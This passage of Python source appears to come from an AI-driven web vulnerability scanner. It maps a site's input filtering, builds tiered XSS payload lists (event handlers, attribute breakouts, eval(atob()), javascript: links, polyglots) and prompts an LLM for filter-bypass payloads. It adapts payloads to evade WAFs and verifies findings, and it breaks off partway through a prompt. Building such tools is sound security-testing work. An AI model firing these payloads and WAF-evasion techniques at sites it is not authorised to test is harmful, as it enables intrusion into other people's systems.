            # Check CSP header
            csp_resp = await self._make_request(url, "GET", {})
            if csp_resp:
                headers = csp_resp.get("headers", {})
                csp = headers.get("Content-Security-Policy", "") or headers.get("content-security-policy", "")
                if csp:
                    filter_map["csp_policy"] = csp

        await self.log("info", f"    [FILTER] Chars allowed: {filter_map['chars_allowed']}, blocked: {filter_map['chars_blocked']}")

        # Phase B: Tag probing (only if < and > allowed)
        if "<" in filter_map["chars_allowed"] and ">" in filter_map["chars_allowed"]:
            test_tags = [
                "script", "img", "svg", "body", "input", "details", "video",
                "audio", "iframe", "a", "select", "textarea", "marquee",
                "math", "table", "style", "form", "button",
                "xss", "custom", "animatetransform", "set",
            ]
            for tag in test_tags:
                tc = f"nst{hashlib.md5(tag.encode()).hexdigest()[:4]}"
                probe = f"<{tag} {tc}=1>"
                body = await _send_probe(probe)
                if body and f"<{tag}" in body.lower():
                    filter_map["tags_allowed"].append(tag)
                else:
                    filter_map["tags_blocked"].append(tag)

            await self.log("info", f"    [FILTER] Tags allowed: {filter_map['tags_allowed']}")

            # Phase C: Event probing (using first allowed tag)
            if filter_map["tags_allowed"]:
                test_tag = filter_map["tags_allowed"][0]
                test_events = [
                    "onload", "onerror", "onfocus", "onblur", "onmouseover",
                    "onclick", "onmouseenter", "ontoggle", "onbegin",
                    "onanimationend", "onanimationstart", "onfocusin",
                    "onpointerover", "onpointerenter", "onpointerdown",
                    "onresize", "onscroll", "onwheel", "onhashchange", "onpageshow",
                ]
                for event in test_events:
                    ec = f"nse{hashlib.md5(event.encode()).hexdigest()[:4]}"
                    probe = f"<{test_tag} {event}={ec}>"
                    body = await _send_probe(probe)
                    if body and event in body.lower():
                        filter_map["events_allowed"].append(event)
                    else:
                        filter_map["events_blocked"].append(event)

                await self.log("info", f"    [FILTER] Events allowed: {filter_map['events_allowed']}")

        # WAF detection
        if body:
            waf_indicators = ["blocked", "forbidden", "waf", "firewall", "not acceptable"]
            if any(ind in body.lower() for ind in waf_indicators):
                filter_map["waf_detected"] = True
                await self.log("warning", f"    [FILTER] WAF/filter detected!")

        return filter_map

    def _escalation_payloads(self, filter_map: Dict, context: str) -> List[str]:
        """Build escalation payload list ordered by complexity, filtered by what's allowed.

        Tier 1: Direct payloads using allowed tags/events
        Tier 2: Encoding bypasses
        Tier 3: Alert alternatives
        Tier 4: Context-specific breakouts
        Tier 5: Polyglots
        """
        payloads: List[str] = []
        allowed_tags = filter_map.get("tags_allowed", [])
        allowed_events = filter_map.get("events_allowed", [])
        chars_allowed = filter_map.get("chars_allowed", [])

        # Tier 1: Direct payloads with allowed tag+event combos
        for tag in allowed_tags[:6]:
            for event in allowed_events[:6]:
                if tag == "svg" and event == "onload":
                    payloads.append("<svg onload=alert(1)>")
                elif tag == "body" and event == "onload":
                    payloads.append("<body onload=alert(1)>")
                elif event in ("onfocus", "onfocusin"):
                    payloads.append(f"<{tag} {event}=alert(1) autofocus tabindex=1>")
                elif event == "ontoggle" and tag == "details":
                    payloads.append("<details open ontoggle=alert(1)>")
                elif event == "onbegin":
                    payloads.append(f"<svg><animatetransform onbegin=alert(1)>")
                elif event == "onanimationend":
                    payloads.append(
                        f"<style>@keyframes x{{}}</style>"
                        f"<{tag} style=animation-name:x onanimationend=alert(1)>"
                    )
                else:
                    payloads.append(f"<{tag} {event}=alert(1)>")

        # Tier 2: Encoding/alt-syntax when parentheses or specific chars blocked
        if "(" not in chars_allowed and "`" in chars_allowed:
            for i, p in enumerate(list(payloads)[:5]):
                payloads.append(p.replace("alert(1)", "alert`1`"))

        if "<" not in chars_allowed:
            # Angle brackets blocked — attribute breakout payloads
            for q in ['"', "'"]:
                if q in chars_allowed:
                    payloads.extend([
                        f'{q} onfocus=alert(1) autofocus x={q}',
                        f'{q} onmouseover=alert(1) x={q}',
                        f'{q} autofocus onfocus=alert(1) x={q}',
                        f'{q}><img src=x onerror=alert(1)>',
                        f'{q}><svg onload=alert(1)>',
                    ])

        # Tier 3: Alert function alternatives
        alert_alternatives = [
            ("alert(1)", "confirm(1)"),
            ("alert(1)", "prompt(1)"),
            ("alert(1)", "print()"),
            ("alert(1)", "eval(atob('YWxlcnQoMSk='))"),
            ("alert(1)", "window['alert'](1)"),
            ("alert(1)", "Function('alert(1)')()"),
        ]
        base_payloads = list(payloads)[:3]
        for bp in base_payloads:
            for old, new in alert_alternatives[:3]:
                alt = bp.replace(old, new)
                if alt not in payloads:
                    payloads.append(alt)

        # Tier 4: Context-specific breakouts
        if context in ("js_string_single", "js_string_double"):
            quote = "'" if "single" in context else '"'
            payloads.extend([
                f"{quote};alert(1)//",
                f"{quote}-alert(1)-{quote}",
                f"</script><script>alert(1)</script>",
                f"</script><img src=x onerror=alert(1)>",
            ])
        if context == "js_template_literal":
            payloads.extend(["${alert(1)}", "${alert(document.domain)}"])
        if context == "href":
            payloads.extend([
                "javascript:alert(1)",
                "javascript:alert(document.domain)",
                "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)",
            ])
        if context in ("textarea", "title"):
            tag = "textarea" if context == "textarea" else "title"
            payloads.extend([
                f"</{tag}><script>alert(1)</script>",
                f"</{tag}><img src=x onerror=alert(1)>",
            ])
        if context == "attribute_double":
            payloads.extend(['" onfocus=alert(1) autofocus x="', '"><svg onload=alert(1)>'])
        if context == "attribute_single":
            payloads.extend(["' onfocus=alert(1) autofocus x='", "'><svg onload=alert(1)>"])

        # Tier 5: Polyglots
        payloads.extend([
            "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'-alert(1)-'",
            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        ])

        # Deduplicate while preserving order
        seen: set = set()
        unique: List[str] = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        return unique

    async def _ai_generate_xss_payloads(
        self,
        filter_map: Dict,
        context_info: Dict,
        challenge_hint: str = "",
        max_payloads: int = 10,
    ) -> List[str]:
        """Use LLM to generate custom XSS payloads based on filter analysis and context."""
        if not self.llm.is_available():
            return []

        await self.log("info", f"    [AI] Generating custom XSS payloads for context '{context_info.get('context', 'unknown')}'...")

        prompt = f"""You are an elite XSS researcher. Generate {max_payloads} XSS payloads to bypass the detected filters.

**Injection Context:** {context_info.get('context', 'unknown')}
**Before injection point:** ...{context_info.get('before_context', '')[-80:]}
**After injection point:** {context_info.get('after_context', '')[:40]}...
**Enclosing tag:** {context_info.get('enclosing_tag', 'none')}
**Attribute name:** {context_info.get('attribute_name', 'none')}
**Quote character:** {context_info.get('quote_char', 'none')}

**Filter Analysis:**
- Characters allowed: {filter_map.get('chars_allowed', [])}
- Characters blocked: {filter_map.get('chars_blocked', [])}
- Tags allowed: {filter_map.get('tags_allowed', [])}
- Tags blocked: {filter_map.get('tags_blocked', [])}
- Events allowed: {filter_map.get('events_allowed', [])}
- Events blocked: {filter_map.get('events_blocked', [])}
- Encoding: {filter_map.get('encoding_behavior', 'unknown')}
- CSP: {filter_map.get('csp_policy') or 'none'}

{"**Challenge Hint:** " + challenge_hint if challenge_hint else ""}

**Rules:**
1. ONLY use characters, tags, and events from the allowed lists
2. Each payload must trigger alert(1), alert(document.domain), or print()
3. For attribute context: break out with the correct quote char then add event handler
4. For JS string context: close the string and inject code
5. Try creative bypasses: backtick alert, eval(atob()), Function constructor
6. If no tags allowed but angle brackets allowed: try custom tags (<xss>, <custom>)
7. If nothing in allowed lists: try encoding bypasses

Respond with ONLY a JSON array of payload strings:
["payload1", "payload2", ...]"""

        try:
            payloads = await self.llm.generate_json(
                prompt,
                get_system_prompt("testing"),
                task_type="xss_payloads",
                array=True,
            )

            if payloads and isinstance(payloads, list):
                payloads = [p for p in payloads if isinstance(p, str) and len(p) > 0]
                await self.log("info", f"    [AI] Generated {len(payloads)} custom payloads")
                return payloads[:max_payloads]
        except Exception as e:
            await self.log("debug", f"    [AI] Payload generation failed: {e}")

        return []

    async def _browser_verify_stored_xss(self, form: Dict, payload: str,
                                          text_fields: List[str],
                                          display_url: str) -> Optional[Dict]:
        """Use Playwright browser to verify stored XSS with real form submission."""
        if not self.browser_validation_enabled or not HAS_PLAYWRIGHT or BrowserValidator is None:
            return None

        try:
            validator = BrowserValidator(screenshots_dir="reports/screenshots")
            await validator.start(headless=True)
            try:
                # Build form_data with CSS selectors for Playwright
                browser_form_data = {}
                for inp in form.get("inputs", []):
                    selector = f"[name='{inp}']"
                    if inp in text_fields:
                        browser_form_data[selector] = payload
                    elif inp.lower() in ("email",):
                        browser_form_data[selector] = "test@test.com"
                    elif inp.lower() in ("website", "url"):
                        browser_form_data[selector] = "http://test.com"
                    elif inp.lower() in ("name",):
                        browser_form_data[selector] = "TestUser"
                    else:
                        browser_form_data[selector] = "test"

                finding_id = hashlib.md5(
                    f"stored_xss_{form.get('action', '')}_{payload[:20]}".encode()
                ).hexdigest()[:12]

                result = await validator.verify_stored_xss(
                    finding_id=finding_id,
                    form_url=form.get("page_url", form.get("action", "")),
                    form_data=browser_form_data,
                    display_url=display_url,
                    timeout=20000
                )
                return result
            finally:
                await validator.stop()
        except Exception as e:
            await self.log("debug", f"    Browser stored XSS verification failed: {e}")
            return None

    def _get_request_timeout(self) -> aiohttp.ClientTimeout:
        """Get request timeout, very short if cancelled for fast stop."""
        if self._cancelled:
            return aiohttp.ClientTimeout(total=0.1)
        return aiohttp.ClientTimeout(total=10)

    async def _make_request(self, url: str, method: str, params: Dict, use_json: bool = False) -> Optional[Dict]:
        """Make HTTP request with resilient request engine (retry, rate limiting, circuit breaker)"""
        if self.is_cancelled():
            return None
        # Auto-detect JSON for REST API endpoints
        parsed_path = urlparse(url).path.lower()
        is_rest = use_json or any(p in parsed_path for p in ("/api/", "/rest/", "/v1/", "/v2/", "/graphql"))
        try:
            if self.request_engine:
                if method.upper() == "GET":
                    result = await self.request_engine.request(
                        url, method="GET", params=params, allow_redirects=False)
                elif is_rest:
                    req_headers = {"Content-Type": "application/json"}
                    if self.auth_headers:
                        req_headers.update(self.auth_headers)
                    result = await self.request_engine.request(
                        url, method=method.upper(), json_data=params,
                        headers=req_headers, allow_redirects=False)
                else:
                    result = await self.request_engine.request(
                        url, method=method.upper(), data=params, allow_redirects=False)
                if result:
                    return {
                        "status": result.status,
                        "body": result.body,
                        "headers": result.headers,
                        "url": result.url,
                    }
                return None
            # Fallback: direct session (no request_engine)
            timeout = self._get_request_timeout()
            if method.upper() == "GET":
                async with self.session.get(url, params=params, allow_redirects=False, timeout=timeout, ssl=False) as resp:
                    body = await resp.text()
                    return {
                        "status": resp.status,
                        "body": body,
                        "headers": dict(resp.headers),
                        "url": str(resp.url)
                    }
            elif is_rest:
                req_headers = {"Content-Type": "application/json"}
                if self.auth_headers:
                    req_headers.update(self.auth_headers)
                async with self.session.post(url, json=params, allow_redirects=False, timeout=timeout, ssl=False,
                                             headers=req_headers) as resp:
                    body = await resp.text()
                    return {
                        "status": resp.status,
                        "body": body,
                        "headers": dict(resp.headers),
                        "url": str(resp.url)
                    }
            else:
                async with self.session.post(url, data=params, allow_redirects=False, timeout=timeout, ssl=False) as resp:
                    body = await resp.text()
                    return {
                        "status": resp.status,
                        "body": body,
                        "headers": dict(resp.headers),
                        "url": str(resp.url)
                    }
        except Exception as e:
            return None

    async def _make_request_with_injection(
        self, url: str, method: str, payload: str,
        injection_point: str = "parameter",
        param_name: str = "id",
        header_name: str = "",
        cookie_name: str = ""
    ) -> Optional[Dict]:
        """Make HTTP request with payload injected into the correct location.

        injection_point: "parameter" | "header" | "cookie" | "body" | "path"
        Uses RequestEngine for retry, rate limiting, and circuit breaker.
        """
        if self.is_cancelled():
            return None
        headers = {}
        params = {}
        cookies = {}
        data = None

        if injection_point == "header":
            headers[header_name or "X-Forwarded-For"] = payload
        elif injection_point == "cookie":
            cookies[cookie_name or "session"] = payload
        elif injection_point == "body":
            data = payload if isinstance(payload, str) and payload.strip().startswith("<?xml") else {param_name: payload}
        elif injection_point == "path":
            url = url.rstrip("/") + "/" + payload
        else:  # "parameter" (default)
            params = {param_name: payload}

        content_type_header = {}
        if injection_point == "body" and isinstance(data, str):
            content_type_header = {"Content-Type": "application/xml"}
        merged_headers = {**headers, **content_type_header}

        try:
            if self.request_engine:
                # Adapt payload for WAF bypass if WAF detected
                if self._waf_result and self._waf_result.detected_wafs:
                    waf_name = self._waf_result.detected_wafs[0].name
                    # Only adapt parameter/body payloads (not headers/cookies)
                    if injection_point in ("parameter", "body"):
                        adapted = self.waf_detector.adapt_payload(payload, waf_name, "generic")
                        if adapted and adapted[0] != payload:
                            payload = adapted[0]
                            # Re-apply injection point with adapted payload
                            if injection_point == "body":
                                data = payload if isinstance(payload, str) and payload.strip().startswith("<?xml") else {param_name: payload}
                            else:
                                params = {param_name: payload}

                result = await self.request_engine.request(
                    url, method=method.upper(),
                    params=params if method.upper() == "GET" else None,
                    data=data if isinstance(data, str) else (data or params) if method.upper() != "GET" else None,
                    headers=merged_headers if merged_headers else None,
                    cookies=cookies if cookies else None,
                    allow_redirects=False,
                )
                if result:
                    resp_dict = {
                        "status": result.status, "body": result.body,
                        "headers": result.headers, "url": result.url,
                        "method": method.upper(),
                        "injection_point": injection_point,
                        "injected_header": header_name if injection_point == "header" else "",
                    }
                    # Record result in strategy adapter
                    if self.strategy:
                        self.strategy.record_test_result(
                            url, "", result.status, result.error_type == ErrorType.SUCCESS,
                            result.response_time
                        )
                    return resp_dict
                return None

            # Fallback: direct session (no request_engine)
            timeout = self._get_request_timeout()
            if method.upper() == "GET":
                async with self.session.get(
                    url, params=params, headers=merged_headers,
                    cookies=cookies, allow_redirects=False, timeout=timeout
                ) as resp:
                    body = await resp.text()
                    return {
                        "status": resp.status, "body": body,
                        "headers": dict(resp.headers), "url": str(resp.url),
                        "method": method.upper(),
                        "injection_point": injection_point,
                        "injected_header": header_name if injection_point == "header" else "",
                    }
            else:
                post_data = data if isinstance(data, str) else (data or params)
                async with self.session.post(
                    url, data=post_data, headers=merged_headers,
                    cookies=cookies, allow_redirects=False, timeout=timeout
                ) as resp:
                    body = await resp.text()
                    return {
                        "status": resp.status, "body": body,
                        "headers": dict(resp.headers), "url": str(resp.url),
                        "method": method.upper(),
                        "injection_point": injection_point,
                        "injected_header": header_name if injection_point == "header" else "",
                    }
        except Exception:
            return None

    def _is_response_valid(self, response: Dict) -> bool:
        """Check if the HTTP response indicates a functional application.
        Rejects error pages, connection failures, and non-functional states."""
        status = response.get('status', 0)
        body = response.get('body', '')

        # No response at all
        if not body and status == 0:
            return False

        # Server errors (5xx) - application is not working properly
        if 500 <= status <= 599:
            return False

        # Empty or very short body might indicate the app isn't processing input
        if len(body.strip()) < 10:
            return False

        # Generic error page indicators (not DB errors - those are intentional for sqli)
        body_lower = body.lower()
        non_functional_indicators = [
            "502 bad gateway", "503 service unavailable",
            "504 gateway timeout", "connection refused",
            "could not connect", "service is unavailable",
            "application is not available", "maintenance mode",
        ]
        for indicator in non_functional_indicators:
            if indicator in body_lower:
                return False

        return True

    async def _verify_vulnerability(self, vuln_type: str, payload: str,
                                     response: Dict, baseline: Optional[Dict] = None) -> Tuple[bool, str]:
        """Verify vulnerability using multi-signal verification (XBOW-inspired)"""
        # First check: is the response from a functional application?
        if not self._is_response_valid(response):
            return False, ""

        body = response.get('body', '')
        status = response.get('status', 0)
        headers = response.get('headers', {})

        # Get VulnEngine tester result
        mapped_type = self._map_vuln_type(vuln_type)
        tester = self.vuln_registry.get_tester(mapped_type)

        try:
            tester_result = tester.analyze_response(
                payload, status, headers, body, context={}
            )
        except Exception as e:
            await self.log("debug", f"  Tester error for {mapped_type}: {e}")
            tester_result = (False, 0.0, None)

        # Multi-signal verification
        confirmed, evidence, signal_count = self.response_verifier.multi_signal_verify(
            vuln_type, payload, response, baseline, tester_result
        )

        if confirmed:
            await self.log("debug", f"  Multi-signal confirmed ({signal_count} signals): {evidence[:100]}")
            return True, evidence

        # If 1 signal found but low confidence, still return True to let AI confirm
        if signal_count == 1 and evidence:
            await self.log("debug", f"  Single signal, needs AI: {evidence[:100]}")
            return True, evidence

        return False, ""

    def _extract_signal_names(self, evidence: str) -> List[str]:
        """Extract signal names from evidence string (e.g., 'baseline_diff', 'payload_effect')."""
        signals = []
        evidence_lower = evidence.lower() if evidence else ""
        if "response diff:" in evidence_lower or "length delta" in evidence_lower:
            signals.append("baseline_diff")
        if "new error patterns:" in evidence_lower:
            signals.append("new_errors")
        if any(kw in evidence_lower for kw in
               ["payload in", "sql error", "file content", "command output",
                "template expression", "xss payload", "reflected", "injected header",
                "redirect to"]):
            signals.append("payload_effect")
        if "pattern match" in evidence_lower or "tester_match" in evidence_lower:
            signals.append("tester_match")
        return signals if signals else ["unknown"]

    async def _judge_finding(self, vuln_type: str, url: str, param: str,
                              payload: str, evidence: str, test_resp: Dict,
                              baseline: Optional[Dict] = None,
                              method: str = "GET",
                              injection_point: str = "parameter") -> Optional[Finding]:
        """Run ValidationJudge pipeline and create/reject finding accordingly.

        Returns Finding if approved, None if rejected (rejection stored internally).
        """
        signals = self._extract_signal_names(evidence)

        judgment = await self.validation_judge.evaluate(
            vuln_type, url, param, payload, test_resp, baseline,
            signals, evidence, self._make_request, method, injection_point
        )

        await self.log("info", f"    [JUDGE] {vuln_type} | score={judgment.confidence_score}/100 "
                       f"| verdict={judgment.verdict}")

        # Record outcome in access control learner for adaptive learning
        if self.access_control_learner:
            try:
                resp_body = test_resp.get("body", "") if isinstance(test_resp, dict) else ""
                resp_status = test_resp.get("status", 0) if isinstance(test_resp, dict) else 0
                self.access_control_learner.record_test(
                    vuln_type=vuln_type,
                    target_url=url,
                    status_code=resp_status,
                    response_body=resp_body,
                    is_true_positive=judgment.approved,
                    pattern_notes=f"score={judgment.confidence_score} verdict={judgment.verdict}"
                )
            except Exception:
                pass

        if not judgment.approved:
            await self.log("debug", f"    [JUDGE] Rejected: {judgment.rejection_reason}")
            await self._store_rejected_finding(
                vuln_type, url, param, payload,
                judgment.evidence_summary, test_resp
            )
            # Update rejection reason with judge's detailed reason
            if self.rejected_findings:
                self.rejected_findings[-1].rejection_reason = judgment.rejection_reason
                self.rejected_findings[-1].confidence_score = judgment.confidence_score
                self.rejected_findings[-1].confidence = str(judgment.confidence_score)
                self.rejected_findings[-1].confidence_breakdown = judgment.confidence_breakdown
            return None

        # Approved — create finding
        finding = self._create_finding(
            vuln_type, url, param, payload,
            judgment.evidence_summary, test_resp,
            ai_confirmed=(judgment.confidence_score >= 90)
        )
        finding.confidence_score = judgment.confidence_score
        finding.confidence = str(judgment.confidence_score)
        finding.confidence_breakdown = judgment.confidence_breakdown
        if judgment.proof_of_execution:
            finding.proof_of_execution = judgment.proof_of_execution.detail
        if judgment.negative_controls:
            finding.negative_controls = judgment.negative_controls.detail
        return finding

    async def _ai_confirm_finding(self, vuln_type: str, url: str, param: str,
                                   payload: str, response: str, evidence: str) -> bool:
        """Use AI to confirm finding and reduce false positives (LEGACY - kept for fallback)"""
        # If LLM not available, rely on strict technical verification only
        if not self.llm.is_available():
            await self.log("debug", f"  LLM not available - using strict technical verification for {vuln_type}")
            # Without AI confirmation, apply stricter criteria
            return self._strict_technical_verify(vuln_type, payload, response, evidence)

        # Inject access control learning context for BOLA/BFLA/IDOR types
        acl_learning_hint = ""
        acl_types = {"bola", "bfla", "idor", "privilege_escalation", "auth_bypass",
                     "forced_browsing", "broken_auth", "mass_assignment", "account_takeover"}
        if vuln_type in acl_types and self.access_control_learner:
            try:
                domain = urlparse(url).netloc
                acl_ctx = self.access_control_learner.get_learning_context(vuln_type, domain)
                if acl_ctx:
                    acl_learning_hint = f"\n{acl_ctx}\n"
                hints = self.access_control_learner.get_evaluation_hints(
                    vuln_type, response if isinstance(response, str) else "", 200
                )
                if hints and hints.get("likely_false_positive"):
                    acl_learning_hint += (
                        f"\nWARNING: Learned patterns suggest this is LIKELY A FALSE POSITIVE "
                        f"(pattern: {hints['pattern_type']}, FP signals: {hints['fp_signals']})\n"
                    )
            except Exception:
                pass

        prompt = f"""Analyze this potential {vuln_type.upper()} vulnerability and determine if it's REAL or a FALSE POSITIVE.

**Target Information:**
- URL: {url}
- Vulnerable Parameter: {param}
- Payload Used: {payload}
- Evidence Found: {evidence}

**Response Excerpt:**
```
{response[:1500]}
```
{acl_learning_hint}
**Vulnerability-Specific Analysis Required:**

For {vuln_type.upper()}, confirm ONLY if:
{"- The injected SQL syntax causes a database error OR returns different data than normal input" if vuln_type == "sqli" else ""}
{"- The JavaScript payload appears UNESCAPED in the response body (not just reflected)" if vuln_type == "xss" else ""}
{"- The file content (e.g., /etc/passwd, win.ini) appears in the response" if vuln_type == "lfi" else ""}
{"- The template expression was EVALUATED (e.g., 7*7 became 49, not {{7*7}})" if vuln_type == "ssti" else ""}
{"- Internal/cloud resources were accessed (metadata, localhost content)" if vuln_type == "ssrf" else ""}
{"- Command output (uid=, gid=, directory listing) appears in response" if vuln_type == "rce" else ""}
{"- CRITICAL: Do NOT check status codes. Compare actual response DATA. Does the response contain a DIFFERENT user's private data (email, phone, address, orders)? If it shows empty body, error message, login page, or YOUR OWN data → FALSE POSITIVE." if vuln_type in acl_types else ""}

**Critical Questions:**
1. Does the evidence show the vulnerability being EXPLOITED, not just reflected?
2. Is there definitive proof of unsafe processing?
3. Could this evidence be normal application behavior or sanitized output?
4. Is the HTTP response a proper application response (not a generic error page or 404)?

**IMPORTANT:** Be conservative. Many scanners report false positives. Only confirm if you see CLEAR exploitation evidence.

Respond with exactly one of:
- "CONFIRMED: [brief explanation of why this is definitely exploitable]"
- "FALSE_POSITIVE: [brief explanation of why this is not a real vulnerability]" """

        try:
            system = get_prompt_for_vuln_type(vuln_type, "confirmation")
            ai_response = await self.llm.generate(prompt, system, task_type="confirm_finding")

            if "CONFIRMED" not in ai_response.upper():
                return False

            # Anti-hallucination: cross-validate AI claim against actual HTTP response
            if not self._cross_validate_ai_claim(vuln_type, payload, response, ai_response):
                await self.log("debug", f"  AI said CONFIRMED but cross-validation failed for {vuln_type}")
                return False

            return True
        except Exception:
            # If AI fails, do NOT blindly trust - apply strict technical check
            await self.log("debug", f"  AI confirmation failed, using strict technical verification")
            return self._strict_technical_verify(vuln_type, payload, response if isinstance(response, str) else "", evidence)

    def _cross_validate_ai_claim(self, vuln_type: str, payload: str,
                                  response_body: str, ai_response: str) -> bool:
        """Cross-validate AI's CONFIRMED claim against actual HTTP response.

        Even when AI says 'CONFIRMED', we verify that the claimed evidence
        actually exists in the HTTP response body. This prevents hallucinated
        confirmations.
        """
        body = response_body.lower() if response_body else ""

        if vuln_type in ("xss", "xss_reflected", "xss_stored"):
            # XSS: payload must exist AND be in executable/interactive context
            if not payload:
                return True  # Can't validate without payload
            if payload.lower() not in body and payload not in (response_body or ""):
                return False  # Payload not reflected at all
            from backend.core.xss_context_analyzer import analyze_xss_execution_context
            ctx = analyze_xss_execution_context(response_body or "", payload)
            return ctx["executable"] or ctx["interactive"]

        elif vuln_type in ("sqli", "sqli_error"):
            # SQLi: at least one DB error pattern must be in body
            db_patterns = [
                "sql syntax", "mysql_", "pg_query", "sqlite", "ora-0",
                "sqlstate", "odbc", "unclosed quotation", "syntax error"
            ]
            return any(p in body for p in db_patterns)

        elif vuln_type in ("lfi", "path_traversal"):
            # LFI: file content markers must be present
            markers = ["root:x:", "daemon:x:", "www-data:", "[boot loader]"]
            return any(m.lower() in body for m in markers)

        elif vuln_type == "ssti":
            # SSTI: evaluated result must exist as standalone token, raw expression should not
            import re as _re
            for expr, expected in [("7*7", "49"), ("7*'7'", "7777777"), ("3*3", "9")]:
                if expr in (payload or ""):
                    # Require the result as a standalone token, not substring
                    pattern = r'(?<!\d)' + _re.escape(expected) + r'(?!\d)'
                    if _re.search(pattern, response_body or "") and expr not in (response_body or ""):
                        return True
            return False

        elif vuln_type in ("rce", "command_injection"):
            # RCE: command output markers
            markers = ["uid=", "gid=", "root:x:", "/bin/"]
            return any(m in body for m in markers)

        elif vuln_type in ("ssrf", "ssrf_cloud"):
            # SSRF: must have actual internal resource content, NOT just status/length diff
            ssrf_markers = ["ami-id", "instance-id", "instance-type", "local-hostname",
                           "computemetadata", "root:x:0:0:"]
            return any(m in body for m in ssrf_markers)

        elif vuln_type == "open_redirect":
            # Open redirect: must have actual redirect evidence
            if response_body:
                import re as _re
                location_match = _re.search(r'location:\s*(\S+)', response_body, _re.IGNORECASE)
                if location_match:
                    loc = location_match.group(1)
                    return any(d in loc for d in ["evil.com", "attacker.com"])
            return False

        elif vuln_type in ("crlf_injection", "header_injection"):
            # CRLF: injected header name/value must appear in response
            injected_indicators = ["x-injected", "x-crlf-test", "injected"]
            return any(ind in body for ind in injected_indicators)

        elif vuln_type == "xxe":
            # XXE: file content from entity expansion
            markers = ["root:x:", "daemon:x:", "[boot loader]"]
            return any(m.lower() in body for m in markers)

        elif vuln_type == "nosql_injection":
            # NoSQL: error patterns
            nosql_markers = ["mongoerror", "bsoninvalid", "casterror"]
            return any(m in body for m in nosql_markers)

        # For other types, default to False (don't trust AI blindly)
        return False

    @staticmethod
    def _evidence_in_response(claimed_evidence: str, response_body: str) -> bool:
        """Check if AI-claimed evidence actually exists in the HTTP response.

        Extracts quoted strings and key phrases from evidence text,
        then checks if they appear in the actual response body.
        """
        if not claimed_evidence or not response_body:
            return False

        body_lower = response_body.lower()

        # Extract quoted strings from evidence
        import re
        quoted = re.findall(r'["\']([^"\']{3,})["\']', claimed_evidence)
        for q in quoted:
            if q.lower() in body_lower:
                return True

        # Extract key technical phrases
        key_phrases = re.findall(r'\b(?:error|exception|root:|uid=|daemon|mysql|sqlite|admin|password)\w*', claimed_evidence.lower())
        for phrase in key_phrases:
            if phrase in body_lower:
                return True

        return False

    def _strict_technical_verify(self, vuln_type: str, payload: str, response_body: str, evidence: str) -> bool:
        """Strict technical verification when AI is not available.
        Only confirms findings with high-confidence evidence patterns."""
        body = response_body.lower() if response_body else ""

        if vuln_type in ("xss", "xss_reflected", "xss_stored", "xss_dom"):
            # XSS: payload must appear in executable/interactive context
            if not payload:
                return False
            if payload.lower() not in body and payload not in (response_body or ""):
                return False
            from backend.core.xss_context_analyzer import analyze_xss_execution_context
            ctx = analyze_xss_execution_context(response_body or "", payload)
            return ctx["executable"] or ctx["interactive"]

        elif vuln_type == "sqli":
            # SQLi: must have actual DB error messages, not generic "error" text
            strong_indicators = [
                "you have an error in your sql syntax",
                "unclosed quotation mark",
                "mysql_fetch", "mysql_query", "mysqli_",
                "pg_query", "pg_exec",
                "sqlite3.operationalerror", "sqlite_error",
                "ora-00", "ora-01",
                "microsoft ole db provider for sql",
                "sqlstate[",
                "syntax error at or near",
                "unterminated quoted string",
                "quoted string not properly terminated",
            ]
            for indicator in strong_indicators:
                if indicator in body:
                    return True
            return False

        elif vuln_type == "lfi":
            # LFI: must have actual file content markers
            strong_markers = ["root:x:0:0:", "daemon:x:", "www-data:", "[boot loader]", "[fonts]"]
            for marker in strong_markers:
                if marker in body:
                    return True
            return False

        elif vuln_type == "ssti":
            # SSTI: only confirm if expression was evaluated
            if "49" in body and "7*7" not in body and ("{{7*7}}" in payload or "${7*7}" in payload):
                return True
            return False

        elif vuln_type == "rce":
            # RCE: must have command output
            rce_markers = ["uid=", "gid=", "root:x:0:0"]
            for marker in rce_markers:
                if marker in body:
                    return True
            return False

        elif vuln_type == "ssrf":
            # SSRF: must access internal resources
            if "root:x:0:0" in body or "ami-" in body or "instance-id" in body:
                return True
            return False

        elif vuln_type == "open_redirect":
            # Open redirect: evidence must mention redirect to external domain
            if "evil.com" in evidence.lower() or "redirect" in evidence.lower():
                return True
            return False

        elif vuln_type == "nosql_injection":
            # NoSQL: must have actual NoSQL error patterns
            nosql_errors = [
                "mongoerror", "bsoninvalid", "bson.errors",
                "castexception", "json parse error", "invalid $",
            ]
            for err in nosql_errors:
                if err in body:
                    return True
            return False

        elif vuln_type == "html_injection":
            # HTML injection: payload tag must appear unescaped in response
            if not payload:
                return False
            payload_lower = payload.lower()
            html_tags = ["<h1", "<div", "<marquee", "<b>", "<u>", "<font", "<form"]
            for tag in html_tags:
                if tag in payload_lower and tag in body:
                    escaped = tag.replace("<", "&lt;")
                    if escaped not in body:
                        return True
            return False

        elif vuln_type == "parameter_pollution":
            # HPP: without baseline, cannot confirm — reject
            return False

        elif vuln_type == "type_juggling":
            # Type juggling: without baseline, cannot confirm — reject
            return False

        elif vuln_type == "jwt_manipulation":
            # JWT: without baseline, require very strong evidence
            if "admin" in body and "true" in body:
                return True
            return False

        # Default: reject unknown types without AI
        return False

    # ── AI Enhancement Methods ──────────────────────────────────────────

    async def _ai_interpret_response(self, vuln_type: str, payload: str,
                                      response_excerpt: str) -> Optional[str]:
        """Use AI to interpret an HTTP response after a vulnerability test.

        Returns a brief interpretation of what happened (reflected, filtered, etc.).
        """
        if not self.llm.is_available():
            return None

        try:
            prompt = f"""Briefly analyze this HTTP response after testing for {vuln_type.upper()}.

Payload sent: {payload[:200]}

Response excerpt (first 1000 chars):
```
{response_excerpt[:1000]}
```

Answer in 1-2 sentences: Was the payload reflected? Filtered? Blocked by WAF? Ignored? What happened?"""

            system = get_system_prompt("interpretation")
            result = await self.llm.generate(prompt, system, task_type="interpret_response")
            return result.strip()[:300] if result else None
        except Exception:
            return None

    async def _ai_validate_exploitation(self, finding_dict: Dict) -> Optional[Dict]:
        """Use AI to validate whether a confirmed finding is truly exploitable.

        Returns analysis dict with effectiveness assessment and notes.
        """
        if not self.llm.is_available():
            return None

        try:
            prompt = f"""Evaluate this confirmed vulnerability finding for real-world exploitability.

**Finding:**
- Type: {finding_dict.get('vulnerability_type', '')}
- Severity: {finding_dict.get('severity', '')}
- Endpoint: {finding_dict.get('affected_endpoint', '')}
- Parameter: {finding_dict.get('parameter', '')}
